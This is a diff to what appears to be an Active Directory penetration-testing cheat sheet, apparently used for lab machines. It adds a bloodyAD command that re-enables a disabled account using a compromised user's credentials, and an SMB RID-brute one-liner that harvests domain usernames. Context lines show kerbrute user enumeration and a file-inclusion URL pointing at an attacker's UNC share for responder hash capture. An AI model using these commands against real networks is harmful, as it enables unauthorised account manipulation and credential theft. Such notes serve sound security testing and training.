@@ -131,6 +131,12 @@ Brute-Force users in AD by wordlist tool `kerbrute`
 kerbrute userenum --dc 'AWSJPDC0522.shibuya.vl'  -d shibuya.vl -t 10 ~/wordlists/Usernames/Names/names.txt
 ```
 
+If exists error `KDC_ERR_CLIENT_REVOKED` need to enable user in AD
+
+```bash
+bloodyAD --host 10.10.10.10 -d domain -u compromised_user -p 'password' remove uac 'target_user' -f ACCOUNTDISABLE
+```
+
 [[Kerberos]]
 == Kerberos ticket
 
@@ -269,6 +275,12 @@ http://somesite.com/index.php?file=\\10.10.10.10\Share
 ```
 
 don't forgot to start `responder` in same network as target, replace `10.10.10.10` by your ip
+
+Check all users by smb and write them to file
+
+```bash
+net smb domain -u username -p 'password' --rid-brute | grep -iE 'SidTypeUser' | grep -viE 'WINDOWS|\$' | awk '{print $6}' | awk -F'\\' '{print $2}' | tee usernames.txt
+```
 
 [[NTLM]]
 == NTLM Relay Attack
